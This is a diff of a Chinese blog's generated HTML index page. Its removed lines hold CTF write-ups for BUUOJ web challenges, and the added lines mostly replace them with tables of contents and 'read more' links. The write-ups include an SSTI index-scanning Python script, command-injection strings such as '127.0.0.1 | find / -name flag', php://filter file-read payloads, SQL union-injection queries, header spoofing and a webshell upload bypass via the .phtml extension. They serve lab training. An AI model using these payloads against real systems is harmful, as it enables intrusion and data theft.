alt="在这里插入图片描述"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">	time.sleep(<span class="number">0.06</span>)//赵师傅靶机有访问频率限制，所以加上sleep</span><br><span class="line">	url = <span class="string">&#x27;http://6b31caef-86aa-49f5-b819-14ec6d3637e6.node3.buuoj.cn/qaq?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&#x27;</span>% i</span><br><span class="line">	<span class="comment">#print(url)</span></span><br><span class="line">	res = requests.get(url)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">		print(url)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>运行后得到os类在117位，然后初始化此类（<code>?name=&#123;&#123;"".__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;</code>），用pepon执行命令，可以看到flag在根目录下，cat一下就出来了<br><img src="https://img-blog.csdnimg.cn/20200611082102973.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200611082144159.png" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><blockquote>
-<p>RCE的利用</p>
-</blockquote>
-<p>开了靶机，黑客既视感<br><img src="https://img-blog.csdnimg.cn/20200611082246944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上面的THINKPHP5是一个php框架，用参数s引入一个不存在的模块爆出版本信息，然后去搜搜有没有漏洞hhh<br><img src="https://img-blog.csdnimg.cn/20200611084056466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接搜5.0.23的RCE,flag在根目录下，cat一下就好<br><img src="https://img-blog.csdnimg.cn/20200611084228995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="BJDCTF-2nd-假猪套天下第"><a href="#BJDCTF-2nd-假猪套天下第" class="headerlink" title="[BJDCTF 2nd]假猪套天下第"></a>[BJDCTF 2nd]假猪套天下第</h1><blockquote>
-<p>HTTP Header基础知识考察<br>这道题是Y1ng大师傅出的题，考的很基础<br>Y1ng师傅出题笔记：<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2056.html#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80">https://www.gem-love.com/ctf/2056.html#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80</a><br>Y1ng推荐的HTTP Header 详解：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jxl1996/p/10245958.html">https://www.cnblogs.com/jxl1996/p/10245958.html</a></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200611084438687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin弱口令登陆发现，但是用其他的账户随便输都能进去，进去后啥也没有，抓包看看<br><img src="https://img-blog.csdnimg.cn/20200611084653455.png" alt="在这里插入图片描述"><br>302跳转！，进去注释给的页面<br><img src="https://img-blog.csdnimg.cn/20200611085307456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200611085415184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没发现啥有用的，在抓包看看，cookie里面有个time参数，根据页面提示把他改到99年以后，又说我们不是来自本地的用户<br><img src="https://img-blog.csdnimg.cn/20200611085605328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用xff修改后（X-Forwarded-For:127.0.0.1直接加到repeater最下面就好），说我Too young too simple，那就换种方式，用Client-IP或者X-Real-IP；<br>然后提示访问要来自gem-love.com，用Referer:gem-love.com;<br>接着提示我们的浏览器不是Commodo 64，至于Commodo 64是什么自行搜索，然后用Commodore 64把UA头改了就行；<br>然后说邮箱不对，加上From:<a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#103;&#101;&#109;&#45;&#108;&#111;&#x76;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#x72;&#111;&#x6f;&#116;&#x40;&#103;&#101;&#109;&#45;&#108;&#111;&#x76;&#x65;&#46;&#x63;&#x6f;&#x6d;</a>;<br>最后提示代理服务器需要是y1ng.vip，或者你可以py100一月hhh，加上via:y1ng.vip;<br>大功告成，解一下base64就好了<br><img src="https://img-blog.csdnimg.cn/20200611091429240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<p>持续更新</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/GD3NE8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -877,7 +681,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/3F66KMD/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -891,7 +695,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">ACTF2020 新生赛 -- WP</a>
+            <a href="/2020/3F66KMD/" class="post-title-link" itemprop="url">ACTF2020 新生赛 -- WP</a>
         </h2>
 
         <div class="post-meta">
@@ -908,7 +712,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:25" itemprop="dateModified" datetime="2020-09-28T22:07:25+08:00">2020-09-28</time>
+                <time title="修改时间：2020-09-30 09:25:44" itemprop="dateModified" datetime="2020-09-30T09:25:44+08:00">2020-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -926,14 +730,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>1.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -945,34 +749,26 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<blockquote>
+          <blockquote>
 <p>做题思路记录，同时感谢赵师傅和Y1NG的环境与源码</p>
 </blockquote>
-<p>@[TOC]</p>
-<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>主页显示是一个链接，点进去看看，URL出现file=，结合题目判断为文件包含<br><img src="https://img-blog.csdnimg.cn/20200518155754767.png" alt="在这里插入图片描述"><br>用伪协议读flag.php，一般语句为<code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
-<blockquote>
-<p>php:// 输入输出流<br>php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>read=convert.base64-encode读出来的文件base64加密<br>resource=xxx读取文件路径（相对/绝对）<br>文件读取可以参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">这篇文章</a></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200518160523628.png" alt="在这里插入图片描述"><br>解密即可<br><img src="https://img-blog.csdnimg.cn/20200518160542772.png" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>exec，这不是php里面命令执行的函数嘛，主页是个ping的api<br><img src="https://img-blog.csdnimg.cn/2020051816072354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到ping首先想到命令执行漏洞，此题似乎没有任何过滤，直接淦就完了<br>先看看flag在不在本目录（因为搜索耗时太长）<code>127.0.0.1 | ls</code>，用<code>|</code>可以只输出后面命令执行的结果，如果想都输出可以用<code>||</code>，<code>;</code><br><img src="https://img-blog.csdnimg.cn/20200518161658119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并没有，那就找吧，<code>127.0.0.1 | find / -name flag</code>，多等一会，这是从根目录开始find的<br><img src="https://img-blog.csdnimg.cn/2020051816180858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到了，直接cat就好<br><img src="https://img-blog.csdnimg.cn/20200518161832616.png" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>题目就已经提示了是文件备份</p>
-<blockquote>
-<p>常见文件备份有 <code>.swp(vim未正常退出备份)</code> <code>.bak</code> <code>.back</code><br>暂时就知道这么多，持续更</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200518162746342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载后给了源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;<span class="comment">//包含flag文件</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;<span class="comment">//获取key参数</span></span><br><span class="line">	    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">	    <span class="keyword">if</span>(!is_numeric($key)) &#123;<span class="comment">//判断key是否为数值OR数字字符串，不仅可以检查10进制，16进制也可以</span></span><br><span class="line">	        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);<span class="comment">//不是则退出脚本</span></span><br><span class="line">	    &#125;</span><br><span class="line">	    $key = intval($key);<span class="comment">//获取变量整数数值</span></span><br><span class="line">	    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">	    <span class="keyword">if</span>($key == $str) &#123;<span class="comment">//弱比较</span></span><br><span class="line">	        <span class="keyword">echo</span> $flag;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<!-- TOC -->
 
-<blockquote>
-<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a><br><img src="https://img-blog.csdnimg.cn/20200518164306276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-</blockquote>
-<hr>
-<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>鼠标悬浮在小灯泡上出现上传处<br><img src="https://img-blog.csdnimg.cn/2020051816463558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先传个一句话试试，看看源码是不是前端限制<br><img src="https://img-blog.csdnimg.cn/20200518164713804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到了，前端限制，可以在console里面把函数置空，也可以在bp里面改后缀，我是在console里面弄得，发现后端也有限制<br><img src="https://img-blog.csdnimg.cn/20200518164947205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改改后缀试试，php3,php4,php5,pht,phtml,先上传了个图片，看看给不给路径<br><img src="https://img-blog.csdnimg.cn/20200518165132766.png" alt="在这里插入图片描述"><br>pht也能上传成功，但是不能连上，应该是没配置这个选项，最终用的phtml后缀，上antsword<br><img src="https://img-blog.csdnimg.cn/20200518165654746.png" alt="在这里插入图片描述"></p>
-<hr>
-
+<ul>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude">[ACTF2020 新生赛]Include</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec">[ACTF2020 新生赛]Exec</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bbackupfile">[ACTF2020 新生赛]BackupFile</a></li>
+<li><a href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bupload">[ACTF2020 新生赛]Upload</a></li>
+</ul>
+<!-- /TOC -->
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/3F66KMD/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -991,7 +787,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/3F518AW/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -1005,7 +801,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">BUUOJ   极客大挑战 2019套餐</a>
+            <a href="/2020/3F518AW/" class="post-title-link" itemprop="url">BUUOJ   极客大挑战 2019套餐</a>
         </h2>
 
         <div class="post-meta">
@@ -1022,7 +818,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:26" itemprop="dateModified" datetime="2020-09-28T22:07:26+08:00">2020-09-28</time>
+                <time title="修改时间：2020-09-30 09:33:11" itemprop="dateModified" datetime="2020-09-30T09:33:11+08:00">2020-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1040,14 +836,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>4.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -1059,43 +855,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<blockquote>
+          <blockquote>
 <p>仅为做题思路，记下笔记，如有错误烦请斧正</p>
 </blockquote>
-<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>进题目发现是个登陆页面<br><img src="https://img-blog.csdnimg.cn/20200510222050509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin admin登陆一下<br><img src="https://img-blog.csdnimg.cn/20200510222136276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意URL，试试万能密码<code>?username=admin&amp;password=admin&#39; or &#39;1&#39;=&#39;1</code>(tip：当passwd不对时后面的or 1=1恒真导致错误密码也可登陆)<br><img src="https://img-blog.csdnimg.cn/20200510222355982.png" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>题目主页是个可爱的小猫<br><img src="https://img-blog.csdnimg.cn/20200510222716536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码（weber必做的事哈哈）发现php代码<br><img src="https://img-blog.csdnimg.cn/20200510222817108.png" alt="在这里插入图片描述"><br>根据提示传参<br><img src="https://img-blog.csdnimg.cn/20200510222856511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="[极客大挑战 2019]Secret"></a>[极客大挑战 2019]Secret</h1><p>哇哦，这背景与文字色<br><img src="https://img-blog.csdnimg.cn/20200510223152652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看源码，发现另一个页面<br><img src="https://img-blog.csdnimg.cn/2020051022323758.png" alt="在这里插入图片描述"><br>套娃？<br><img src="https://img-blog.csdnimg.cn/20200510223315520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再点<br><img src="https://img-blog.csdnimg.cn/20200510223328894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为bp一直再开，看看target，把每个response都看了一下，发现跳转了一个<br><img src="https://img-blog.csdnimg.cn/20200510223617694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问一下给了源码，过滤了<code>../、tp、input、data</code>穿透和代码执行不行了，直接伪协议读，防止输出过滤加上base64encode，payload：<br><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="https://img-blog.csdnimg.cn/20200510223650439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读出来的base解码得到flag<br><img src="https://img-blog.csdnimg.cn/20200510224234473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>和第一题界面差不多，最上面的小红字放大看看，弱密码试试依然错误<br><img src="https://img-blog.csdnimg.cn/20200510224528634.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200510224429468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我就不用sqlmap了，关于sqlmap扫文件百度有很多，手工sql好了，查列为4的时候报错<br><img src="https://img-blog.csdnimg.cn/20200510225100127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>联合查询记得把账号置为不存在的（随便输），不然正常回显会把联合查询的回显挤下去，自己可以试试<br><img src="https://img-blog.csdnimg.cn/20200510225216528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>正常注入，查表名<code>username=1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&amp;password=admin</code><br><img src="https://img-blog.csdnimg.cn/20200510225526380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查列名<code>?username=1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;l0ve1ysq1&quot;%23&amp;password=admin</code><br><img src="https://img-blog.csdnimg.cn/20200510225629121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查字段<code>?username=1&#39; union select 1,group_concat(id,&quot;:&quot;,username,&quot;:&quot;,password),3 from l0ve1ysq1%23&amp;password=admin</code><br><img src="https://img-blog.csdnimg.cn/20200510225730936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>太乱了，看源码（快跑~）<br><img src="https://img-blog.csdnimg.cn/20200510225831744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>主页挺好看<br><img src="https://img-blog.csdnimg.cn/20200510225934274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没找到有用的信息（Syclover2019招新群：671301484，逃~）看源码<br><img src="https://img-blog.csdnimg.cn/20200510230036317.png" alt="在这里插入图片描述"><br>进去看看，考察的是http头信息，具体可百度看师傅们总结的http header<br><img src="https://img-blog.csdnimg.cn/20200510230139793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>bp抓包加上<code>referer</code><br><img src="https://img-blog.csdnimg.cn/20200510230322994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>更改浏览器标识<code>User-Agent</code><br><img src="https://img-blog.csdnimg.cn/20200510230401508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>XFF</code>伪造IP<br><img src="https://img-blog.csdnimg.cn/20200510230506860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>get it</p>
-<hr>
